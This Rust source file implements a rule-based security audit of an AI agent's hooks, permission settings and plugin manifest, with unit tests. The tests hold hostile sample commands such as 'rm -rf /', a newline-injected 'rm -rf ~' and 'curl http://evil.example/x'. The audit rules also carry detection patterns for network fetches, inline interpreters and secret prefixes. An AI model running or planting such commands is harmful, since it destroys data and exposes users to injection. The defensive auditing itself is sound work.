//! Purpose: AgentShield-style security audit of claude-core's OWN config surface
//!   — hooks, settings/permissions, and the plugin manifest — for injection
//!   vectors, over-broad permissions, secrets, and misconfiguration.
//! Caller: commands.rs `config-audit` dispatch.
//! Dependencies: std::fs, std::path, serde_json, crate::args, crate::json, crate::runtime.
//! Main Functions: run_config_audit_command, audit_hooks_doc, audit_settings_doc, audit_manifest_doc.
//! Side Effects: Reads config files under the repo and/or Claude home; writes a report.
//!
//! Why this exists: the security-and-compliance-auditor skill audits the USER's
//! code. Nothing audited the agent's own configuration — the hooks, permission
//! rules, and manifest that shape what the agent is allowed to do. A
//! prompt-injected or over-broad config is an attack surface distinct from
//! application code. This is the deterministic, rule-based half of an
//! adversarial config audit (the model-driven red-team half stays a skill).
//!
//! Design: each surface has a pure `audit_*_doc(&JsonValue, &mut Vec<Finding>)`
//! rule function and a thin file-reading wrapper. Production and tests both call
//! the pure function, so the rule logic is tested directly with no duplication.

use std::fs;
use std::io::Write;
use std::path::Path;

use serde_json::Value as JsonValue;

use crate::args::FlagSet;
use crate::json::{write_indented, Value};
use crate::runtime::resolve_repository_root;

/// One audit finding. Severity drives the exit code: any `high` fails the audit.
#[derive(Debug, Clone)]
struct Finding {
    severity: Severity,
    surface: String,
    message: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Severity {
    High,
    Medium,
    Low,
}

impl Severity {
    fn label(self) -> &'static str {
        match self {
            Severity::High => "high",
            Severity::Medium => "medium",
            Severity::Low => "low",
        }
    }
}

pub fn run_config_audit_command(
    arguments: &[String],
    standard_output: &mut dyn Write,
    standard_error: &mut dyn Write,
) -> u8 {
    let mut flag_set = FlagSet::new("config-audit");
    flag_set.string_flag("repo-root", "");
    flag_set.bool_flag("json", false);
    if let Err(parse_error) = flag_set.parse(arguments) {
        let _ = writeln!(standard_error, "{}", parse_error.message);
        return 1;
    }
    let repository_root = match resolve_repository_root(flag_set.string_value("repo-root")) {
        Ok(path) => path,
        Err(error) => {
            let _ = writeln!(standard_error, "config-audit: {error}");
            return 1;
        }
    };

    let mut findings = Vec::new();
    if let Some(document) = read_json(&repository_root.join(".claude").join("hooks.json")) {
        audit_hooks_doc(&document, &mut findings);
    }
    if let Some(document) = read_json(&repository_root.join(".claude").join("settings.json")) {
        audit_settings_doc(&document, &mut findings);
    }
    audit_local_settings_tracking(&repository_root, &mut findings);
    if let Some(document) = read_json(&repository_root.join(".claude-plugin").join("plugin.json")) {
        audit_manifest_doc(&document, &mut findings);
    }

    let high = findings
        .iter()
        .filter(|finding| finding.severity == Severity::High)
        .count();
    let medium = findings
        .iter()
        .filter(|finding| finding.severity == Severity::Medium)
        .count();
    let low = findings
        .iter()
        .filter(|finding| finding.severity == Severity::Low)
        .count();

    if flag_set.bool_value("json") {
        let payload = Value::Object(vec![
            ("high".into(), Value::Number(high.to_string())),
            ("medium".into(), Value::Number(medium.to_string())),
            ("low".into(), Value::Number(low.to_string())),
            (
                "findings".into(),
                Value::Array(findings.iter().map(finding_to_value).collect()),
            ),
        ]);
        if write_indented(standard_output, &payload).is_err() {
            return 1;
        }
        return if high > 0 { 2 } else { 0 };
    }

    let _ = writeln!(
        standard_output,
        "config-audit: {high} high, {medium} medium, {low} low finding(s)"
    );
    if findings.is_empty() {
        let _ = writeln!(
            standard_output,
            "  no findings — hooks, permissions, and manifest look clean"
        );
        return 0;
    }
    for finding in &findings {
        let _ = writeln!(
            standard_output,
            "  [{}] {}: {}",
            finding.severity.label(),
            finding.surface,
            finding.message
        );
    }
    // Fail closed only on high-severity findings so the audit can gate a release
    // without blocking on advisory medium/low notes.
    if high > 0 {
        2
    } else {
        0
    }
}

fn finding_to_value(finding: &Finding) -> Value {
    Value::Object(vec![
        (
            "severity".into(),
            Value::String(finding.severity.label().to_string()),
        ),
        ("surface".into(), Value::String(finding.surface.clone())),
        ("message".into(), Value::String(finding.message.clone())),
    ])
}

/// Audit a `hooks.json` document. Hook commands are arbitrary shell the agent
/// runs, so shell metacharacters (injection), network fetches (exfiltration),
/// and non-managed commands are flagged.
fn audit_hooks_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
    let Some(hooks) = document.get("hooks").and_then(JsonValue::as_object) else {
        return;
    };
    for (event_name, entries) in hooks {
        let Some(entries) = entries.as_array() else {
            continue;
        };
        for entry in entries {
            let Some(commands) = entry.get("hooks").and_then(JsonValue::as_array) else {
                continue;
            };
            for command_entry in commands {
                let command = command_entry
                    .get("command")
                    .and_then(JsonValue::as_str)
                    .unwrap_or_default();
                if contains_shell_metacharacters(command) {
                    findings.push(Finding {
                        severity: Severity::High,
                        surface: format!("hooks.json:{event_name}"),
                        message: format!(
                            "hook command contains shell metacharacters (injection risk): {command}"
                        ),
                    });
                }
                if command.contains("curl") || command.contains("wget") {
                    findings.push(Finding {
                        severity: Severity::High,
                        surface: format!("hooks.json:{event_name}"),
                        message:
                            "hook command fetches from the network — exfiltration/supply-chain risk"
                                .to_string(),
                    });
                }
                if invokes_inline_interpreter(command) {
                    findings.push(Finding {
                        severity: Severity::High,
                        surface: format!("hooks.json:{event_name}"),
                        message: format!(
                            "hook command runs an inline interpreter (arbitrary-code execution distinct from shell chaining): {command}"
                        ),
                    });
                }
                if looks_like_secret_literal(command) || command_embeds_secret(command) {
                    findings.push(Finding {
                        severity: Severity::High,
                        surface: format!("hooks.json:{event_name}"),
                        message: "hook command embeds what looks like a committed secret literal"
                            .to_string(),
                    });
                }
                if !command.is_empty() && !is_managed_claude_skills_command(command) {
                    findings.push(Finding {
                        severity: Severity::Medium,
                        surface: format!("hooks.json:{event_name}"),
                        message: format!(
                            "hook command is not a managed claude-skills invocation: {command}"
                        ),
                    });
                }
            }
        }
    }
}

/// Audit a `settings.json` document for over-broad or dangerous permission grants.
fn audit_settings_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
    let default_mode = document
        .get("permissions")
        .and_then(|permissions| permissions.get("defaultMode"))
        .and_then(JsonValue::as_str)
        .unwrap_or_default();
    if default_mode == "bypassPermissions" {
        findings.push(Finding {
            severity: Severity::High,
            surface: "settings.json:permissions.defaultMode".to_string(),
            message:
                "defaultMode is `bypassPermissions` — the agent runs tools without confirmation"
                    .to_string(),
        });
    }
    if let Some(allow) = document
        .get("permissions")
        .and_then(|permissions| permissions.get("allow"))
        .and_then(JsonValue::as_array)
    {
        for rule in allow {
            let rule_text = rule.as_str().unwrap_or_default();
            if rule_text == "Bash" || rule_text == "Bash(*)" || rule_text == "Bash(*:*)" {
                findings.push(Finding {
                    severity: Severity::High,
                    surface: "settings.json:permissions.allow".to_string(),
                    message: format!(
                        "unscoped Bash allow rule grants arbitrary command execution: {rule_text}"
                    ),
                });
            } else if is_unscoped_sensitive_allow(rule_text) {
                // A bare tool name with no scope grants the whole tool. For
                // filesystem- and network-capable tools (Write/Edit/WebFetch/
                // mcp__*) that is a broad grant worth a deliberate decision.
                findings.push(Finding {
                    severity: Severity::Medium,
                    surface: "settings.json:permissions.allow".to_string(),
                    message: format!(
                        "unscoped allow rule grants a sensitive tool without scoping: {rule_text}"
                    ),
                });
            }
        }
    }
}

/// A bare (unscoped) allow rule for a sensitive tool — `Write`, `Edit`,
/// `WebFetch`, `WebSearch`, or any `mcp__*` — grants the entire tool with no
/// pattern restriction. Not as severe as unscoped `Bash` (handled separately as
/// high), but worth a medium flag so least-privilege scoping is a conscious
/// choice. A rule containing `(` is already scoped, so it is exempt.
fn is_unscoped_sensitive_allow(rule_text: &str) -> bool {
    if rule_text.contains('(') {
        return false;
    }
    matches!(rule_text, "Write" | "Edit" | "WebFetch" | "WebSearch")
        || rule_text.starts_with("mcp__")
}

/// Audit a plugin manifest document for MCP server env values that look like
/// committed secret literals, and for servers wired to a remote network URL
/// (a supply-chain/exfiltration surface the agent talks to on every session).
fn audit_manifest_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
    let Some(servers) = document.get("mcpServers").and_then(JsonValue::as_object) else {
        return;
    };
    for (server_name, server) in servers {
        // A `url`/`baseUrl`/`endpoint` pointing at a non-local http(s) host means
        // the agent's tool calls flow to a third party. Flag medium so an
        // intentional remote server is a deliberate, reviewed choice rather than
        // a silent default.
        for url_key in ["url", "baseUrl", "endpoint"] {
            if let Some(url) = server.get(url_key).and_then(JsonValue::as_str) {
                if is_remote_network_url(url) {
                    findings.push(Finding {
                        severity: Severity::Medium,
                        surface: format!("plugin.json:mcpServers.{server_name}.{url_key}"),
                        message: format!(
                            "MCP server points at a remote network URL — tool calls flow to a third party: {url}"
                        ),
                    });
                }
            }
        }
        let Some(env) = server.get("env").and_then(JsonValue::as_object) else {
            continue;
        };
        for (key, value) in env {
            let value_text = value.as_str().unwrap_or_default();
            if looks_like_secret_literal(value_text) {
                findings.push(Finding {
                    severity: Severity::High,
                    surface: format!("plugin.json:mcpServers.{server_name}.env.{key}"),
                    message: "MCP server env value looks like a committed secret literal"
                        .to_string(),
                });
            }
        }
    }
}

/// Whether `url` is a remote http(s) endpoint (not localhost/loopback). A local
/// server (`http://localhost`, `127.0.0.1`, `::1`) is the normal stdio/loopback
/// case and is not flagged; anything else over http(s) sends data off-box.
fn is_remote_network_url(url: &str) -> bool {
    let lowered = url.to_ascii_lowercase();
    if !(lowered.starts_with("http://") || lowered.starts_with("https://")) {
        return false;
    }
    let host = lowered
        .trim_start_matches("https://")
        .trim_start_matches("http://");
    !(host.starts_with("localhost")
        || host.starts_with("127.0.0.1")
        || host.starts_with("[::1]")
        || host.starts_with("0.0.0.0"))
}

/// A committed `settings.local.json` is a hygiene smell: it is per-developer and
/// should be gitignored. Flag (low) if it is tracked by git.
fn audit_local_settings_tracking(repository_root: &Path, findings: &mut Vec<Finding>) {
    let local_path = repository_root.join(".claude").join("settings.local.json");
    if local_path.is_file() && path_is_git_tracked(repository_root, ".claude/settings.local.json") {
        findings.push(Finding {
            severity: Severity::Low,
            surface: "settings.local.json".to_string(),
            message: "settings.local.json is git-tracked — local overrides should be gitignored"
                .to_string(),
        });
    }
}

/// Whether `command` is a genuine managed `claude-skills` invocation — i.e. its
/// FIRST token is the claude-skills binary. A substring test was insufficient:
/// a malicious command like `evilbin --note claude-skills` or
/// `claude-skills hook x & evilbin` contains the substring yet is not (only) a
/// managed invocation, so the substring check let it suppress the "not managed"
/// finding. Anchoring on the first token closes that bypass; chaining/injection
/// in the rest of the line is independently caught by
/// `contains_shell_metacharacters`.
fn is_managed_claude_skills_command(command: &str) -> bool {
    let first_token = command.split_whitespace().next().unwrap_or_default();
    // Strip any directory prefix and a trailing `.exe` so an absolute or
    // Windows path to the binary still matches by basename.
    let basename = first_token
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(first_token);
    let stem = basename
        .strip_suffix(".exe")
        .or_else(|| basename.strip_suffix(".EXE"))
        .unwrap_or(basename);
    stem.eq_ignore_ascii_case("claude-skills")
}

fn contains_shell_metacharacters(command: &str) -> bool {
    // Managed hook commands are bare argv (`claude-skills hook <slug>`); pipes,
    // substitutions, redirects, chaining, backgrounding, or embedded newlines
    // indicate a hand-rolled shell hook. `&` (single) is a command separator on
    // cmd.exe and backgrounds on bash; a newline/CR runs a second command
    // entirely — both were previously missed and let an injected second command
    // slip past the detector.
    command.contains("&&")
        || command.contains("||")
        || command.contains('|')
        || command.contains('&')
        || command.contains(';')
        || command.contains('`')
        || command.contains("$(")
        || command.contains('>')
        || command.contains('<')
        || command.chars().any(|character| character.is_control())
}

/// Whether the command runs an inline interpreter — `bash -c "..."`,
/// `python -c "..."`, `node -e "..."`, `sh -c`, `eval ...`, `perl -e`, `ruby -e`.
/// This is an arbitrary-code-execution class DISTINCT from shell chaining: a
/// command can pass `contains_shell_metacharacters` (no pipes or `;`) yet still
/// run an attacker-controlled program through `-c`/`-e`/`eval`. AgentShield-style
/// auditors flag this separately because the payload is the interpreter's input,
/// not the shell's. Word-boundary matched so a path like `/usr/bin/evaluate`
/// does not trip the `eval` rule.
fn invokes_inline_interpreter(command: &str) -> bool {
    let lowered = command.to_ascii_lowercase();
    // Interpreter inline-code flags: `-c <code>` (sh/bash/python/zsh) and
    // `-e <code>` (node/perl/ruby). Match the flag as a standalone token.
    let has_inline_flag = lowered
        .split_whitespace()
        .any(|token| matches!(token, "-c" | "-e" | "--command" | "--eval"));
    let runs_interpreter = [
        "bash ", "sh ", "zsh ", "python ", "python3 ", "node ", "perl ", "ruby ",
    ]
    .iter()
    .any(|interp| lowered.starts_with(interp) || lowered.contains(&format!("/{interp}")));
    let has_eval_builtin = lowered
        .split(|c: char| c.is_whitespace() || c == ';' || c == '&' || c == '|')
        .any(|token| token == "eval");
    (has_inline_flag && runs_interpreter) || has_eval_builtin
}

/// Whether a hook COMMAND line embeds a secret literal as one of its tokens —
/// e.g. `claude-skills hook x --token AKIA...`. Distinct from auditing MCP env
/// values: a secret pasted onto a hook command line is committed to config and
/// shows up in process listings. Reuses `looks_like_secret_literal` per token so
/// the detection rule stays in one place.
fn command_embeds_secret(command: &str) -> bool {
    command.split_whitespace().any(looks_like_secret_literal)
}

fn looks_like_secret_literal(value: &str) -> bool {
    // Env values that reference another variable (`${FOO}`/`$FOO`) or are empty
    // are fine. A long opaque token, or known key prefixes, are suspicious.
    if value.is_empty() || value.contains('$') {
        return false;
    }
    let upper = value.to_ascii_uppercase();
    let prefixed = ["AKIA", "SK-", "GHP_", "XOXB-", "-----BEGIN"]
        .iter()
        .any(|prefix| upper.starts_with(prefix));
    let long_token = value.len() >= 32
        && value
            .chars()
            .filter(|character| character.is_ascii_alphanumeric())
            .count()
            >= 28;
    prefixed || long_token
}

fn read_json(path: &Path) -> Option<JsonValue> {
    let text = fs::read_to_string(path).ok()?;
    serde_json::from_str(&text).ok()
}

/// Best-effort git-tracked check. Returns false when git is unavailable so the
/// audit never errors on a non-git checkout.
fn path_is_git_tracked(repository_root: &Path, relative_path: &str) -> bool {
    crate::runtime::run_command(
        "git",
        &[
            "ls-files".to_string(),
            "--error-unmatch".to_string(),
            relative_path.to_string(),
        ],
        Some(repository_root),
    )
    .map(|result| result.code == 0)
    .unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_managed_hook_produces_no_findings() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"claude-skills hook pre-tool-use"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(findings.is_empty(), "findings: {findings:?}");
    }

    #[test]
    fn shell_metacharacter_hook_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"claude-skills hook pre-tool-use && rm -rf /"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(findings
            .iter()
            .any(|f| f.severity == Severity::High && f.message.contains("shell metacharacters")));
    }

    #[test]
    fn single_ampersand_background_hook_is_flagged() {
        // Regression: the detector previously only caught `&&`, so a single `&`
        // (background on bash, separator on cmd.exe) slipped through even though
        // it chains a second command.
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"claude-skills hook pre-tool-use & maliciousbin"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::High && f.message.contains("shell metacharacters")),
            "single & must be flagged: {findings:?}"
        );
    }

    #[test]
    fn newline_injected_hook_is_flagged() {
        // A newline runs a second command outright; it must be caught even when
        // the line starts with the managed binary.
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"claude-skills hook x\nrm -rf ~"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::High && f.message.contains("shell metacharacters")),
            "embedded newline must be flagged: {findings:?}"
        );
    }

    #[test]
    fn substring_claude_skills_does_not_suppress_unmanaged_finding() {
        // Regression: the medium catch-all used a substring test, so a command
        // merely MENTIONING claude-skills evaded the "not managed" finding. The
        // structural first-token check must still flag a non-managed command.
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"evilbin --note claude-skills"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.message.contains("not a managed claude-skills invocation")),
            "first-token check must flag non-managed command: {findings:?}"
        );
    }

    #[test]
    fn managed_command_with_path_prefix_counts_as_managed() {
        // An absolute/Windows path to the managed binary must still count as
        // managed by basename, so a legitimate hook is not noise-flagged.
        assert!(is_managed_claude_skills_command(
            "claude-skills hook pre-tool-use"
        ));
        assert!(is_managed_claude_skills_command(
            "/usr/local/bin/claude-skills hook stop"
        ));
        assert!(is_managed_claude_skills_command(
            "C:\\tools\\claude-skills.exe hook user-prompt-submit"
        ));
        assert!(!is_managed_claude_skills_command("evilbin claude-skills"));
        assert!(!is_managed_claude_skills_command(""));
    }

    #[test]
    fn network_fetch_hook_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"SessionStart":[{"matcher":"","hooks":[{"type":"command","command":"curl http://evil.example/x"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(findings.iter().any(|f| f.severity == Severity::High));
    }

    #[test]
    fn bypass_permissions_mode_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"permissions":{"defaultMode":"bypassPermissions"}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(findings
            .iter()
            .any(|f| f.severity == Severity::High && f.message.contains("bypassPermissions")));
    }

    #[test]
    fn unscoped_bash_allow_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(r#"{"permissions":{"allow":["Bash"]}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(findings
            .iter()
            .any(|f| f.severity == Severity::High && f.message.contains("arbitrary command")));
    }

    #[test]
    fn scoped_bash_allow_is_clean() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"permissions":{"allow":["Bash(git diff:*)"]}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(findings.is_empty(), "findings: {findings:?}");
    }

    #[test]
    fn inline_interpreter_hook_is_high_severity() {
        // `python -c "..."` runs arbitrary code without any shell metacharacter,
        // so the shell-chaining detector alone would miss it.
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"SessionStart":[{"matcher":"","hooks":[{"type":"command","command":"python -c import os"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::High && f.message.contains("inline interpreter")),
            "inline interpreter must be flagged: {findings:?}"
        );
    }

    #[test]
    fn eval_builtin_hook_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"Stop":[{"matcher":"","hooks":[{"type":"command","command":"eval some_var"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::High && f.message.contains("inline interpreter")),
            "eval builtin must be flagged: {findings:?}"
        );
    }

    #[test]
    fn invokes_inline_interpreter_does_not_false_positive_on_paths() {
        // A path component like `/usr/bin/evaluate` must not trip the `eval`
        // rule, and a plain managed command must not look like an interpreter.
        assert!(!invokes_inline_interpreter(
            "claude-skills hook pre-tool-use"
        ));
        assert!(!invokes_inline_interpreter("/usr/bin/evaluate --flag"));
        assert!(invokes_inline_interpreter("bash -c \"rm -rf /\""));
        assert!(invokes_inline_interpreter("node -e console.log(1)"));
    }

    #[test]
    fn secret_on_hook_command_line_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"SessionStart":[{"matcher":"","hooks":[{"type":"command","command":"claude-skills hook x --token AKIAIOSFODNN7EXAMPLEKEY12345678"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::High && f.message.contains("secret literal")),
            "embedded secret must be flagged: {findings:?}"
        );
    }

    #[test]
    fn unscoped_sensitive_allow_is_medium_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"permissions":{"allow":["Write","WebFetch"]}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        let medium: Vec<_> = findings
            .iter()
            .filter(|f| f.severity == Severity::Medium && f.message.contains("sensitive tool"))
            .collect();
        assert_eq!(
            medium.len(),
            2,
            "Write and WebFetch must each flag: {findings:?}"
        );
    }

    #[test]
    fn scoped_sensitive_allow_is_clean() {
        // A scoped rule (has parentheses) made a deliberate restriction.
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"permissions":{"allow":["Write(src/**)","Read"]}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(
            findings.is_empty(),
            "scoped Write and benign Read must be clean: {findings:?}"
        );
    }

    #[test]
    fn remote_mcp_url_is_medium_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"mcpServers":{"remote":{"url":"https://api.example.com/mcp"}}}"#,
        )
        .unwrap();
        audit_manifest_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::Medium && f.message.contains("remote network URL")),
            "remote MCP URL must be flagged: {findings:?}"
        );
    }

    #[test]
    fn localhost_mcp_url_is_clean() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"mcpServers":{"local":{"url":"http://localhost:8080/mcp"}}}"#)
                .unwrap();
        audit_manifest_doc(&doc, &mut findings);
        assert!(findings.is_empty(), "localhost is not remote: {findings:?}");
    }

    #[test]
    fn is_remote_network_url_classifies_hosts() {
        assert!(is_remote_network_url("https://evil.example.com"));
        assert!(is_remote_network_url("http://10.0.0.5:9000"));
        assert!(!is_remote_network_url("http://localhost:3000"));
        assert!(!is_remote_network_url("http://127.0.0.1"));
        assert!(!is_remote_network_url("stdio://local"));
        assert!(!is_remote_network_url(""));
    }

    #[test]
    fn mcp_env_secret_literal_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"mcpServers":{"x":{"env":{"TOKEN":"AKIAIOSFODNN7EXAMPLEKEY12345678"}}}}"#,
        )
        .unwrap();
        audit_manifest_doc(&doc, &mut findings);
        assert!(findings.iter().any(|f| f.severity == Severity::High));
    }

    #[test]
    fn mcp_env_var_reference_is_clean() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"mcpServers":{"x":{"env":{"TOKEN":"${MY_TOKEN}"}}}}"#)
                .unwrap();
        audit_manifest_doc(&doc, &mut findings);
        assert!(findings.is_empty(), "findings: {findings:?}");
    }
}
